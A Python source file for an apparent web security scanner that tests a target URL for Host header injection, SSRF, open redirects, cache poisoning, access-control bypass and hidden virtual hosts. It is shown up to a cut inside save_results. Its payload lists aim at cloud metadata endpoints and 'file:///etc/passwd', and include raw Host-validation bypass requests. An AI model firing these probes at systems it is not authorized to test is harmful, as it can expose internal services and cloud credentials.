#!/usr/bin/env python3
"""HostHeaderScanner - detect Host header injection, SSRF and open redirect issues."""

import argparse
import json
import re
import socket
import ssl
import statistics
import sys
import time
import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from urllib.parse import parse_qs, urlencode, urlparse

import requests
import urllib3
from colorama import Fore, Style, init
from requests.adapters import HTTPAdapter
from tqdm import tqdm
from urllib3.util.retry import Retry

init(autoreset=True)

# Program metadata
__tool_name__ = "HostHeaderScanner"
__version__ = "1.6.0"
__github_url__ = "https://github.com/kabiri-labs/HostHeaderScanner"


def build_session(timeout, threads, insecure, proxy, extra_headers):
    """Create a connection-pooled, retry-aware requests session."""
    session = requests.Session()
    retry = Retry(
        total=2,
        backoff_factor=0.3,
        status_forcelist=(429, 500, 502, 503, 504),
        allowed_methods=None,  # retry on every method
        raise_on_status=False,
    )
    adapter = HTTPAdapter(
        pool_connections=max(threads, 10),
        pool_maxsize=max(threads * 2, 20),
        max_retries=retry,
    )
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    session.headers.update({
        "User-Agent": f"Mozilla/5.0 (compatible; {__tool_name__}/{__version__})",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive",
    })
    if extra_headers:
        session.headers.update(extra_headers)
    if proxy:
        session.proxies.update({"http": proxy, "https": proxy})
    if insecure:
        session.verify = False
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    session.request_timeout = timeout
    return session


class OOBManager:
    """Out-of-band interaction manager.

    Embeds a per-scan correlation id into OOB payload hostnames and, when a
    listener export URL is supplied (``--oob-poll-url``), polls it afterwards to
    confirm blind interactions. Works with any listener whose export endpoint
    returns the received hostnames in its body: interactsh (``-json``),
    webhook.site, RequestBin, Burp Collaborator exports, custom sinks, etc.
    """

    def __init__(self, oob_domain, poll_url=None):
        self.oob_domain = oob_domain.strip("/").lstrip(".")
        self.poll_url = poll_url
        self.scan_id = uuid.uuid4().hex[:8]
        self.labels = {}

    def host(self, label):
        host = f"{label}-{self.scan_id}.{self.oob_domain}"
        self.labels[label] = host
        return host

    def url(self, label):
        return f"http://{self.host(label)}/"

    def poll(self, session, timeout, attempts=4, delay=3):
        if not self.poll_url:
            return []
        for attempt in range(attempts):
            body = ""
            try:
                body = session.get(self.poll_url, timeout=timeout).text or ""
            except requests.RequestException:
                pass
            hits = [label for label, host in self.labels.items()
                    if host in body or self.scan_id in body]
            if hits:
                return hits
            if attempt < attempts - 1:
                time.sleep(delay)
        return []


def _shell_quote(value):
    return "'" + str(value).replace("'", "'\\''") + "'"


def build_reproduction(entry, target_url, insecure):
    """Build a copy-pasteable command that reproduces a finding."""
    test_type = entry.get("test_type", "")
    method = entry.get("method", "GET")
    url = entry.get("url") or target_url

    # Raw-socket bypasses cannot be expressed with curl; emit a wire-level repro.
    if test_type == "Host Header Bypass" and entry.get("raw_request"):
        parsed = urlparse(target_url)
        host, port = parsed.hostname, parsed.port or (443 if parsed.scheme == "https" else 80)
        wire = entry["raw_request"].replace("\r\n", "\\r\\n")
        if parsed.scheme == "https":
            return (f"printf {_shell_quote(wire)} | "
                    f"openssl s_client -quiet -connect {host}:{port} -servername {host}")
        return f"printf {_shell_quote(wire)} | ncat {host} {port}"

    headers = dict(entry.get("headers") or {})
    if not headers and entry.get("header_name") and entry.get("param_name") is None:
        headers = {entry["header_name"]: entry.get("payload", "")}

    parts = ["curl", "-sk" if insecure else "-s", "-i"]
    if method != "GET":
        parts += ["-X", method]
    for name, value in headers.items():
        parts += ["-H", _shell_quote(f"{name}: {value}")]
    parts.append(_shell_quote(url))
    return " ".join(parts)


class BaseTest:
    """Shared scaffolding for every test type."""

    test_type = "Base"

    def __init__(self, target_url, original_host, session, oob_domain=None,
                 methods=None, threads=5, verbose=1, timeout=10,
                 oob_manager=None, wordlist=None, insecure=False):
        self.target_url = target_url
        self.original_host = original_host
        self.session = session
        self.oob_domain = oob_domain
        self.oob_manager = oob_manager
        self.wordlist = wordlist
        self.insecure = insecure
        self.methods = methods or ["GET"]
        self.threads = threads
        self.verbose = verbose
        self.timeout = timeout
        self.vulnerabilities_found = []
        self.all_results = []

    def request(self, method, url=None, headers=None, allow_redirects=True):
        """Issue a single request, returning the response or None on failure."""
        try:
            return self.session.request(
                method,
                url or self.target_url,
                headers=headers,
                timeout=self.timeout,
                allow_redirects=allow_redirects,
            )
        except requests.RequestException:
            return None

    def run_pool(self, worker, test_cases, description):
        """Run worker over test_cases with a bounded thread pool and progress bar."""
        if not test_cases:
            return
        print(f"\nStarting {description}...")
        try:
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = [executor.submit(worker, *case) for case in test_cases]
                with tqdm(total=len(futures), desc=description, unit="test") as pbar:
                    for future in as_completed(futures):
                        future.result()
                        pbar.update(1)
        except KeyboardInterrupt:
            print(Fore.YELLOW + f"\n[!] {description} interrupted by user.")
            raise

    def record(self, entry):
        """Store a confirmed/suspected finding and optionally print it."""
        entry.setdefault("test_type", self.test_type)
        entry.setdefault("test_result", "Potentially Vulnerable")
        entry["repro"] = build_reproduction(entry, self.target_url, self.insecure)
        self.vulnerabilities_found.append(entry)
        if self.verbose >= 1:
            self._print_finding(entry)

    def _print_finding(self, entry):
        print(Fore.RED + Style.BRIGHT + f"\n[!] {entry['test_type']} Finding!")
        print(f"URL: {entry.get('url')}")
        print(f"Method: {entry.get('method')}")
        if entry.get("header_name"):
            print(f"Header: {entry['header_name']}")
        if entry.get("param_name"):
            print(f"Parameter: {entry['param_name']}")
        print(f"Payload: {entry.get('payload')}")
        print(f"Status Code: {entry.get('status_code')}")
        if entry.get("response_time") is not None:
            print(f"Response Time: {entry['response_time']:.2f}s")
        print(Fore.YELLOW + f"Analysis: {entry.get('analysis')}")
        if entry.get("repro"):
            print(Fore.GREEN + f"Reproduce: {entry['repro']}")
        print(Fore.RED + "-" * 80)

    def run(self):
        raise NotImplementedError


# Headers commonly honoured by reverse proxies / frameworks for host routing.
HOST_HEADERS = [
    "Host",
    "X-Forwarded-Host",
    "X-Forwarded-For",
    "X-Forwarded-Server",
    "X-Host",
    "X-HTTP-Host-Override",
    "X-Original-Host",
    "X-Real-IP",
    "Forwarded",
    "X-Forwarded-Proto",
    "X-Forwarded-Scheme",
    "X-Forwarded-Port",
    "X-Forwarded-Prefix",
    "True-Client-IP",
    "CF-Connecting-IP",
    "Fastly-Client-IP",
    "X-Cluster-Client-IP",
    "Base-Url",
    "Request-Uri",
]

# Subset of headers that frameworks frequently treat as the effective host and
# that proxies often leave unkeyed in the cache (good cache-poisoning candidates).
UNKEYED_HOST_HEADERS = [
    "X-Forwarded-Host",
    "X-Host",
    "X-Forwarded-Server",
    "X-Original-Host",
    "X-HTTP-Host-Override",
    "Base-Url",
]

# Headers that may rewrite the routed path/ACL on the front-end (ACL bypass).
PATH_OVERRIDE_HEADERS = [
    "X-Original-URL",
    "X-Rewrite-URL",
    "X-Override-URL",
    "Request-Uri",
]

# Response headers that reveal whether a cache served the response.
CACHE_STATUS_HEADERS = [
    "X-Cache", "X-Cache-Hits", "Age", "CF-Cache-Status",
    "X-Served-By", "X-Cache-Lookup", "X-Drupal-Cache", "X-Varnish",
]

# Common internal/administrative virtual host names probed via the Host header.
DEFAULT_VHOST_WORDLIST = [
    "admin", "administrator", "internal", "intranet", "corp", "staging",
    "stage", "dev", "development", "test", "testing", "qa", "uat", "preprod",
    "beta", "api", "internal-api", "backend", "private", "jenkins", "gitlab",
    "jira", "confluence", "grafana", "kibana", "prometheus", "vault", "consul",
    "nexus", "sonar", "portal", "dashboard", "manage", "management", "console",
    "status", "metrics", "debug", "phpmyadmin", "adminer", "localhost",
    "gateway", "vpn", "mail",
]


class HostInjectionTest(BaseTest):
    """Reflection-based Host header injection (cache poisoning / link poisoning).

    Injects a unique random marker host and looks for it being reflected into
    the response body, the Location header or any other response header. Because
    the marker is unique, reflection is a high-confidence signal with very few
    false positives.
    """

    test_type = "Host Header Injection"

    def generate_markers(self):
        token = uuid.uuid4().hex[:12]
        marker = f"{token}.example-collab.com"
        markers = {marker}
        # Common bypass shapes that still carry the marker.
        markers.add(f"{self.original_host}.{marker}")
        markers.add(f"{self.original_host}@{marker}")
        if self.oob_manager:
            markers.add(self.oob_manager.host("host"))
        elif self.oob_domain:
            markers.add(f"{token}.{self.oob_domain.strip('/')}")
        return token, markers

    def run(self):
        token, markers = self.generate_markers()
        self.marker_token = token
        test_cases = [
            (method, header, marker)
            for method in self.methods
            for header in HOST_HEADERS
            for marker in markers
        ]
        self.run_pool(self.worker, test_cases, "Host Header Injection Testing")

    def worker(self, method, header_name, marker):
        response = self.request(
            method,
            headers={header_name: marker},
            allow_redirects=False,
        )
        if response is None:
            return

        location = response.headers.get("Location", "")
        body = response.text or ""
        reflected_in_body = self.marker_token in body
        reflected_in_location = self.marker_token in location
        header_hits = [
            name for name, value in response.headers.items()
            if name.lower() != "location" and self.marker_token in str(value)
        ]

        if not (reflected_in_body or reflected_in_location or header_hits):
            if self.verbose == 2:
                self.all_results.append({
                    "test_type": self.test_type,
                    "url": response.url,
                    "method": method,
                    "header_name": header_name,
                    "payload": marker,
                    "status_code": response.status_code,
                    "analysis": "Marker not reflected.",
                    "test_result": "Not Vulnerable",
                })
            return

        parts = []
        if reflected_in_location:
            parts.append(f"Injected host reflected in 'Location' header: {location}")
        if reflected_in_body:
            parts.append("Injected host reflected in response body (cache/link poisoning).")
        if header_hits:
            parts.append(f"Injected host reflected in response header(s): {header_hits}")

        self.record({
            "url": response.url,
            "method": method,
            "headers": {header_name: marker},
            "header_name": header_name,
            "payload": marker,
            "status_code": response.status_code,
            "response_time": response.elapsed.total_seconds(),
            "analysis": " ".join(parts),
        })


class SSRFTest(BaseTest):
    """Time- and content-based SSRF detection via host routing headers."""

    test_type = "SSRF"

    EXCLUDED_HEADERS = {
        "Date", "Server", "Content-Length", "Connection", "Vary",
        "Content-Type", "Set-Cookie", "Age", "Expires", "Last-Modified", "ETag",
    }
    # Indicators that strongly suggest the request reached an internal target.
    INDICATORS = {
        "root:x:0:0:": 5,
        "ami-id": 4,
        "instance-id": 4,
        "iam/security-credentials": 5,
        "computemetadata": 4,
        "could not resolve host": 2,
        "connection refused": 2,
        "no route to host": 3,
        "<title>phpmyadmin</title>": 4,
    }

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.typical_delay = None
        self.baseline_headers = {}
        self.results = []

    def compute_baseline(self, samples=6):
        """Measure a stable baseline latency and capture reference headers."""
        print("\nComputing baseline latency...")
        delays = []
        for i in range(samples):
            start = time.time()
            response = self.request("GET")
            if response is None:
                print(f"Request {i + 1} failed.")
                continue
            elapsed = time.time() - start
            if i == 0:
                self.baseline_headers = response.headers  # warm-up sample
            else:
                delays.append(elapsed)
        if delays:
            delays.sort()
            trimmed = delays[1:-1] if len(delays) > 2 else delays
            self.typical_delay = statistics.mean(trimmed)
            print(f"Baseline latency: {self.typical_delay:.2f}s")
        else:
            self.typical_delay = 1.0
            print("Could not measure latency; defaulting to 1.00s.")

    def generate_payloads(self):
        internal_hosts = [
            "localhost", "127.0.0.1", "0.0.0.0", "169.254.169.254",
            "metadata.google.internal", "192.168.0.1", "192.168.1.1",
            "10.0.0.1", "172.17.0.1", "127.2.2.2",
        ]
        ports = [80, 443, 8080]
        payloads = list(internal_hosts)
        payloads += [f"{host}:{port}" for host in internal_hosts for port in ports]
        if self.oob_manager:
            payloads.append(self.oob_manager.host("ssrf"))
        elif self.oob_domain:
            payloads.append(self.oob_domain.strip("/"))
        return payloads

    def run(self):
        self.compute_baseline()
        payloads = self.generate_payloads()
        ssrf_headers = ["Host", "X-Forwarded-For", "X-Forwarded-Host",
                        "X-Real-IP", "Forwarded"]
        test_cases = [
            (method, header, payload)
            for method in self.methods
            for payload in payloads
            for header in ssrf_headers
        ]
        self.run_pool(self.worker, test_cases, "SSRF Testing")
        self.analyze()

    def worker(self, method, header_name, payload):
        start = time.time()
        response = self.request(method, headers={header_name: payload})
        if response is None:
            return
        elapsed = time.time() - start
        self.results.append({
            "url": response.url,
            "method": method,
            "header_name": header_name,
            "payload": payload,
            "status_code": response.status_code,
            "response_time": elapsed,
            "response_body": (response.text or "")[:2000],
            "response_headers": dict(response.headers),
        })

    def analyze(self):
        if not self.results:
            print(Fore.YELLOW + "No SSRF responses collected for analysis.")
            return

        times = [r["response_time"] for r in self.results]
        mean_time = statistics.mean(times)
        stdev_time = statistics.stdev(times) if len(times) > 1 else 0
        # Only *slow* responses matter for time-based SSRF; fast ones are noise.
        upper_threshold = (mean_time + stdev_time * 3) if stdev_time else mean_time * 2

        patterns = {
            ind: re.compile(re.escape(ind)) for ind in self.INDICATORS
        }

        for result in self.results:
            score = 0
            notes = []

            if result["response_time"] > upper_threshold and result["response_time"] > (self.typical_delay or 0) * 2:
                score += 2
                notes.append(
                    f"Response time {result['response_time']:.2f}s exceeds "
                    f"threshold {upper_threshold:.2f}s."
                )

            body = result["response_body"].lower()
            for indicator, pattern in patterns.items():
                if pattern.search(body):
                    weight = self.INDICATORS[indicator]
                    score += weight
                    notes.append(f"Indicator '{indicator}' (weight {weight}).")

            anomalies = self.detect_header_anomalies(result["response_headers"])
            if anomalies:
                score += 1
                notes.append(f"Header anomalies: {anomalies}.")

            # Require a meaningful score so a lone weak signal does not fire.
            if score >= 3:
                self.record({
                    "url": result["url"],
                    "method": result["method"],
                    "headers": {result["header_name"]: result["payload"]},
                    "header_name": result["header_name"],
                    "payload": result["payload"],
                    "status_code": result["status_code"],
                    "response_time": result["response_time"],
                    "analysis": " ".join(notes),
                })
            elif self.verbose == 2:
                self.all_results.append({
                    "test_type": self.test_type,
                    "url": result["url"],
                    "method": result["method"],
                    "header_name": result["header_name"],
                    "payload": result["payload"],
                    "status_code": result["status_code"],
                    "response_time": result["response_time"],
                    "analysis": "No significant anomalies detected.",
                    "test_result": "Not Vulnerable",
                })

    def detect_header_anomalies(self, response_headers):
        if not self.baseline_headers:
            return []
        anomalies = []
        for header, value in response_headers.items():
            if header in self.EXCLUDED_HEADERS:
                continue
            baseline_value = self.baseline_headers.get(header)
            if baseline_value is None:
                anomalies.append(f"new header '{header}'")
            elif value != baseline_value:
                anomalies.append(f"'{header}' changed")
        return anomalies


class OpenRedirectTest(BaseTest):
    """Detect Host-header driven open redirects via the Location header."""

    test_type = "Open Redirect"
    REDIRECT_CODES = {301, 302, 303, 307, 308}

    def generate_payloads(self):
        payloads = ["example.com", "www.example.com", "example.com:80",
                    "www.example.com:443"]
        if self.oob_manager:
            payloads.insert(0, self.oob_manager.host("redirect"))
        elif self.oob_domain:
            payloads.insert(0, self.oob_domain.strip("/"))
        return payloads

    def run(self):
        payloads = self.generate_payloads()
        test_cases = [
            (method, "Host", payload)
            for method in self.methods
            for payload in payloads
        ]
        self.run_pool(self.worker, test_cases, "Open Redirect Testing")

    def worker(self, method, header_name, payload):
        response = self.request(method, headers={header_name: payload},
                                allow_redirects=False)
        if response is None or response.status_code not in self.REDIRECT_CODES:
            return
        location = response.headers.get("Location", "")
        injected_host = urlparse(f"http://{payload}").hostname
        response_host = urlparse(location).hostname
        if response_host and injected_host and response_host.lower() == injected_host.lower():
            self.record({
                "url": response.url,
                "method": method,
                "headers": {header_name: payload},
                "header_name": header_name,
                "payload": payload,
                "status_code": response.status_code,
                "response_time": response.elapsed.total_seconds(),
                "analysis": f"Redirect to injected host via 'Location': {location}",
            })


class URLParameterTest(BaseTest):
    """Detect SSRF reachable through URL parameters (url=, next=, ...)."""

    test_type = "URL Parameter SSRF"

    PARAMS = ["url", "next", "redirect", "dest", "destination", "uri", "path"]
    INDICATORS = {
        "root:x:0:0:": 5,
        "ami-id": 4,
        "iam/security-credentials": 5,
        "connection refused": 2,
        "permission denied": 2,
        "failed to connect": 2,
    }

    def generate_payloads(self):
        payloads = [
            "http://127.0.0.1", "http://localhost",
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://[::1]", "http://0x7f000001", "http://2130706433",
            "http://0177.0.0.01", "http://127.0.0.1:8080",
            "http://example.com@127.0.0.1", "file:///etc/passwd",
        ]
        if self.oob_manager:
            payloads.append(self.oob_manager.url("param"))
        elif self.oob_domain:
            payloads.append(f"http://{self.oob_domain.strip('/')}")
        return payloads

    def get_baseline_response(self):
        return self._request_with_params({p: "http://example.com" for p in self.PARAMS})

    def _request_with_params(self, values):
        parsed = urlparse(self.target_url)
        query = parse_qs(parsed.query)
        query.update(values)
        new_query = urlencode(query, doseq=True)
        url = parsed._replace(query=new_query).geturl()
        return self.request("GET", url=url)

    def run(self):
        self.baseline_response = self.get_baseline_response()
        if self.baseline_response is None:
            print(Fore.YELLOW + "Baseline request failed; skipping URL parameter test.")
            return
        payloads = self.generate_payloads()
        test_cases = [
            (method, param, payload)
            for method in self.methods
            for payload in payloads
            for param in self.PARAMS
        ]
        self.run_pool(self.worker, test_cases, "URL Parameter SSRF Testing")

    def worker(self, method, param_name, payload):
        parsed = urlparse(self.target_url)
        query = parse_qs(parsed.query)
        query[param_name] = payload
        url = parsed._replace(query=urlencode(query, doseq=True)).geturl()
        start = time.time()
        response = self.request(method, url=url)
        if response is None:
            return
        elapsed = time.time() - start
        if not self.is_response_different(response):
            return
        analysis = self.analyze_response(response)
        if analysis:
            self.record({
                "url": response.url,
                "method": method,
                "param_name": param_name,
                "payload": payload,
                "status_code": response.status_code,
                "response_time": elapsed,
                "analysis": analysis,
            })

    def is_response_different(self, response):
        base = self.baseline_response
        if base.status_code != response.status_code:
            return True
        base_len = len(base.content) or 1
        if abs(base_len - len(response.content)) > 0.1 * base_len:
            return True
        return False

    def analyze_response(self, response):
        text = (response.text or "").lower()
        score = 0
        notes = []
        for indicator, weight in self.INDICATORS.items():
            if indicator in text:
                score += weight
                notes.append(f"Indicator '{indicator}' (weight {weight}).")
        if response.status_code >= 500:
            score += 1
            notes.append(f"Server error status: {response.status_code}.")
        return " ".join(notes) if score >= 5 else None


class RawResponse:
    """Lightweight response object produced by the raw HTTP client."""

    def __init__(self, status_code, headers, text):
        self.status_code = status_code
        self.headers = headers  # list of (name, value) preserving duplicates
        self.text = text

    def get(self, name):
        name = name.lower()
        for header, value in self.headers:
            if header.lower() == name:
                return value
        return None


class RawHTTPClient:
    """Minimal raw HTTP/1.1 client.

    Unlike ``requests``, it sends the request line and header lines verbatim,
    which is what makes duplicate ``Host`` headers, absolute-URI request lines
    and obsolete line folding possible - the building blocks of most Host
    header validation bypasses.
    """

    def __init__(self, timeout=10, verify=True, max_bytes=200_000):
        self.timeout = timeout
        self.verify = verify
        self.max_bytes = max_bytes

    def send(self, scheme, host, port, request_line, header_lines, sni_host=None):
        request = request_line + "\r\n" + "\r\n".join(header_lines) + "\r\n\r\n"
        raw = b""
        sock = None
        try:
            sock = socket.create_connection((host, port), timeout=self.timeout)
            if scheme == "https":
                context = ssl.create_default_context()
                if not self.verify:
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=sni_host or host)
            sock.sendall(request.encode("latin-1", "ignore"))
            sock.settimeout(self.timeout)
            while len(raw) < self.max_bytes:
                try:
                    chunk = sock.recv(8192)
                except (socket.timeout, ssl.SSLError):
                    break
                if not chunk:
                    break
                raw += chunk
        except OSError:
            return None
        finally:
            if sock is not None:
                try:
                    sock.close()
                except OSError:
                    pass
        return self._parse(raw)

    @staticmethod
    def _parse(raw):
        if not raw:
            return None
        head, _, body = raw.partition(b"\r\n\r\n")
        lines = head.split(b"\r\n")
        status_line = lines[0].decode("latin-1", "replace") if lines else ""
        parts = status_line.split(" ", 2)
        status = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 0
        headers = []
        for line in lines[1:]:
            if b":" in line:
                name, value = line.split(b":", 1)
                headers.append((
                    name.decode("latin-1", "replace").strip(),
                    value.decode("latin-1", "replace").strip(),
                ))
        return RawResponse(status, headers, body.decode("latin-1", "replace"))


class HostBypassTest(BaseTest):
    """Host header validation bypasses that require raw, un-normalised HTTP.

    Sends duplicate Host headers, absolute-URI request lines and indented
    (line-folded) headers carrying a unique marker host, then checks whether
    the marker is reflected back - proving the validation can be bypassed.
    """

    test_type = "Host Header Bypass"

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        parsed = urlparse(self.target_url)
        self.scheme = parsed.scheme or "http"
        self.connect_host = parsed.hostname
        self.connect_port = parsed.port or (443 if self.scheme == "https" else 80)
        self.path = parsed.path or "/"
        if parsed.query:
            self.path += "?" + parsed.query
        self.client = RawHTTPClient(timeout=self.timeout, verify=not self._insecure())

    def _insecure(self):
        # Mirror the verification mode chosen for the shared requests session.
        return self.session.verify is False

    def base_lines(self, host_value):
        return [
            f"Host: {host_value}",
            f"User-Agent: Mozilla/5.0 (compatible; {__tool_name__}/{__version__})",
            "Accept: */*",
            "Connection: close",
        ]

    def techniques(self, marker):
        host = self.original_host
        # Each technique returns (name, request_line, header_lines).
        return [
            (
                "Duplicate Host header",
                f"GET {self.path} HTTP/1.1",
                [f"Host: {host}", f"Host: {marker}",
                 f"User-Agent: {__tool_name__}/{__version__}", "Connection: close"],
            ),
            (
                "Absolute-URI request line",
                f"GET {self.scheme}://{marker}{self.path} HTTP/1.1",
                self.base_lines(host),
            ),
            (
                "Indented (line-folded) Host header",
                f"GET {self.path} HTTP/1.1",
                [f"Host: {host}", f" Host: {marker}",
                 f"User-Agent: {__tool_name__}/{__version__}", "Connection: close"],
            ),
            (
                "Host override",
                f"GET {self.path} HTTP/1.1",
                self.base_lines(marker),
            ),
        ]

    def run(self):
        if not self.connect_host:
            return
        token = uuid.uuid4().hex[:12]
        marker = f"{token}.example-collab.com"
        self.marker_token = token
        cases = [(name, line, headers)
                 for name, line, headers in self.techniques(marker)]
        self.run_pool(self.worker, cases, "Host Header Bypass Testing")

    def worker(self, technique, request_line, header_lines):
        response = self.client.send(
            self.scheme, self.connect_host, self.connect_port,
            request_line, header_lines, sni_host=self.connect_host,
        )
        if response is None:
            return
        location = response.get("Location") or ""
        reflected_body = self.marker_token in response.text
        reflected_location = self.marker_token in location
        header_hits = [
            name for name, value in response.headers
            if name.lower() != "location" and self.marker_token in value
        ]
        if not (reflected_body or reflected_location or header_hits):
            return
        notes = [f"Bypass technique: {technique}."]
        if reflected_location:
            notes.append(f"Marker reflected in 'Location': {location}")
        if reflected_body:
            notes.append("Marker reflected in response body.")
        if header_hits:
            notes.append(f"Marker reflected in header(s): {header_hits}")
        self.record({
            "url": self.target_url,
            "method": "GET",
            "header_name": technique,
            "payload": request_line,
            "status_code": response.status_code,
            "analysis": " ".join(notes),
            "raw_request": request_line + "\r\n" + "\r\n".join(header_lines) + "\r\n\r\n",
        })


class CachePoisoningTest(BaseTest):
    """Confirm web cache poisoning, not just reflection.

    For each candidate unkeyed header, a unique cache-buster is added to the
    URL, a poisoning request is sent, and then the same URL is requested again
    *without* the malicious header. If the injected marker survives into the
    clean request, the response was cached - a confirmed poisoning.
    """

    test_type = "Web Cache Poisoning"

    def run(self):
        cases = [(header,) for header in UNKEYED_HOST_HEADERS]
        self.run_pool(self.worker, cases, "Web Cache Poisoning Testing")

    def _url_with_buster(self, buster):
        parsed = urlparse(self.target_url)
        query = parse_qs(parsed.query)
        query["cb"] = buster
        return parsed._replace(query=urlencode(query, doseq=True)).geturl()

    def worker(self, header_name):
        buster = uuid.uuid4().hex[:10]
        token = uuid.uuid4().hex[:12]
        marker = f"{token}.example-collab.com"
        url = self._url_with_buster(buster)

        poison = self.request("GET", url=url, headers={header_name: marker},
                              allow_redirects=False)
        if poison is None:
            return
        if token not in (poison.text or "") and token not in poison.headers.get("Location", ""):
            return  # not reflected, nothing to cache

        # Re-request the identical (cache-buster) URL without the header.
        confirm = self.request("GET", url=url, allow_redirects=False)
        if confirm is None:
            return
        cache_info = {h: confirm.headers[h] for h in CACHE_STATUS_HEADERS
                      if h in confirm.headers}
        poisoned = token in (confirm.text or "") or token in confirm.headers.get("Location", "")

        if poisoned:
            self.record({
                "url": url,
                "method": "GET",
                "header_name": header_name,
                "payload": marker,
                "status_code": confirm.status_code,
                "analysis": (
                    f"CONFIRMED: '{header_name}' is unkeyed and the poisoned "
                    f"response was served to a clean request. Cache headers: "
                    f"{cache_info or 'n/a'}."
                ),
                "test_result": "Vulnerable",
            })
        elif self.verbose == 2:
            self.all_results.append({
                "test_type": self.test_type,
                "url": url,
                "method": "GET",
                "header_name": header_name,
                "payload": marker,
                "status_code": poison.status_code,
                "analysis": (
                    f"Reflected via '{header_name}' but not served from cache "
                    f"on re-request (cache headers: {cache_info or 'n/a'})."
                ),
                "test_result": "Reflected (unconfirmed)",
            })


class AuthBypassTest(BaseTest):
    """Detect Host/forwarding-based access-control bypasses.

    If the target responds 401/403, retry it presenting an internal/trusted
    host or client IP; a transition to 200 (or a materially different body)
    signals a bypass. Also probes front-end path-override headers
    (X-Original-URL / X-Rewrite-URL) used to reach restricted endpoints.
    """

    test_type = "Auth Bypass"

    INTERNAL_VALUES = {
        "Host": ["localhost", "127.0.0.1"],
        "X-Forwarded-Host": ["localhost", "127.0.0.1"],
        "X-Forwarded-For": ["127.0.0.1"],
        "X-Real-IP": ["127.0.0.1"],
        "True-Client-IP": ["127.0.0.1"],
        "X-Forwarded-Server": ["localhost"],
    }

    def run(self):
        baseline = self.request("GET", allow_redirects=False)
        if baseline is None:
            return
        self.baseline_status = baseline.status_code
        self.baseline_len = len(baseline.content)

        cases = []
        if baseline.status_code in (401, 403):
            for header, values in self.INTERNAL_VALUES.items():
                for value in values:
                    cases.append(("host", header, value))
        for header in PATH_OVERRIDE_HEADERS:
            cases.append(("path", header, urlparse(self.target_url).path or "/"))
        self.run_pool(self.worker, cases, "Auth Bypass Testing")

    def worker(self, mode, header_name, value):
        request_url = self.target_url
        if mode == "path":
            # Request the site root but ask the front-end to route to the path.
            parsed = urlparse(self.target_url)
            request_url = parsed._replace(path="/", query="").geturl()
        response = self.request("GET", url=request_url,
                                headers={header_name: value},
                                allow_redirects=False)
        if response is None:
            return

        improved = (
            self.baseline_status in (401, 403)
            and response.status_code == 200
        )
        if not improved:
            return
        self.record({
            "url": request_url,
            "method": "GET",
            "header_name": header_name,
            "payload": value,
            "status_code": response.status_code,
            "analysis": (
                f"Access control bypass: baseline returned "
                f"{self.baseline_status}, but '{header_name}: {value}' "
                f"returned {response.status_code}."
            ),
            "test_result": "Vulnerable",
        })


class VhostDiscoveryTest(BaseTest):
    """Discover internal/hidden virtual hosts via the Host header.

    Establishes a baseline by requesting a host that cannot exist (the default
    virtual host), then sends each wordlist candidate as the Host header. A
    materially different status, body length or page title means a distinct
    virtual host is being served - a common route to internal applications.
    """

    test_type = "Virtual Host Discovery"

    @staticmethod
    def _title(text):
        match = re.search(r"<title[^>]*>(.*?)</title>", text or "", re.I | re.S)
        return match.group(1).strip()[:80] if match else ""

    def run(self):
        candidates = self.wordlist or DEFAULT_VHOST_WORDLIST
        bogus = f"{uuid.uuid4().hex[:16]}.invalid"
        baseline = self.request("GET", headers={"Host": bogus}, allow_redirects=False)
        if baseline is None:
            print(Fore.YELLOW + "Vhost baseline failed; skipping discovery.")
            return
        self.baseline_status = baseline.status_code
        self.baseline_len = len(baseline.content)
        self.baseline_title = self._title(baseline.text)
        self.run_pool(self.worker, [(c,) for c in candidates], "Virtual Host Discovery")

    def candidate_hosts(self, candidate):
        return [
            candidate,
            f"{candidate}.{self.original_host}",
            f"{candidate}.internal",
        ]

    def worker(self, candidate):
        for host in self.candidate_hosts(candidate):
            response = self.request("GET", headers={"Host": host},
                                    allow_redirects=False)
            if response is None:
                continue
            length = len(response.content)
            title = self._title(response.text)
            differs = (
                response.status_code != self.baseline_status
                or abs(length - self.baseline_len) > max(64, 0.2 * self.baseline_len)
                or (title and title != self.baseline_title)
            )
            if differs:
                self.record({
                    "url": self.target_url,
                    "method": "GET",
                    "header_name": "Host",
                    "payload": host,
                    "status_code": response.status_code,
                    "analysis": (
                        f"Distinct virtual host: default (unknown host) was "
                        f"{self.baseline_status}/{self.baseline_len}B, '{host}' "
                        f"returned {response.status_code}/{length}B"
                        + (f", title '{title}'." if title else ".")
                    ),
                })
                return  # one hit per candidate is sufficient


def parse_headers(raw_headers):
    headers = {}
    for item in raw_headers or []:
        if ":" not in item:
            continue
        name, value = item.split(":", 1)
        headers[name.strip()] = value.strip()
    return headers


def parse_arguments():
    parser = argparse.ArgumentParser(description="Host Header Injection Testing Tool")
    parser.add_argument("url", help="Target URL")
    parser.add_argument("--oob", help="OOB/collaborator domain for SSRF correlation")
    parser.add_argument("--oob-poll-url", dest="oob_poll_url",
                        help="Listener export URL polled afterwards to confirm OOB hits")
    parser.add_argument("--wordlist", "-w",
                        help="File of virtual-host names for discovery (one per line)")
    parser.add_argument("--threads", type=int, default=5, help="Number of threads (1-20)")
    parser.add_argument("--timeout", type=float, default=10, help="Per-request timeout in seconds")
    parser.add_argument("--methods", default="GET",
                        help="Comma-separated HTTP methods (e.g. GET,POST)")
    parser.add_argument("--header", "-H", action="append", dest="headers",
                        help="Extra request header 'Name: Value' (repeatable)")
    parser.add_argument("--proxy", help="Proxy URL (e.g. http://127.0.0.1:8080)")
    parser.add_argument("--insecure", "-k", action="store_true",
                        help="Disable TLS certificate verification")
    parser.add_argument("--verbose", type=int, choices=[1, 2], default=1,
                        help="Verbosity level")
    parser.add_argument("--output", "-o", help="Output file (.json or .md)")
    args = parser.parse_args()
    if not 1 <= args.threads <= 20:
        parser.error("The --threads argument must be between 1 and 20.")
    return args


def save_results(output_file, tests, verbose):
    if not output_file:
        return
    extension = output_file.rsplit(".", 1)[-1].lower()
    results = []
    for test in tests:
        results.extend(test.all_results if verbose == 2 else [])
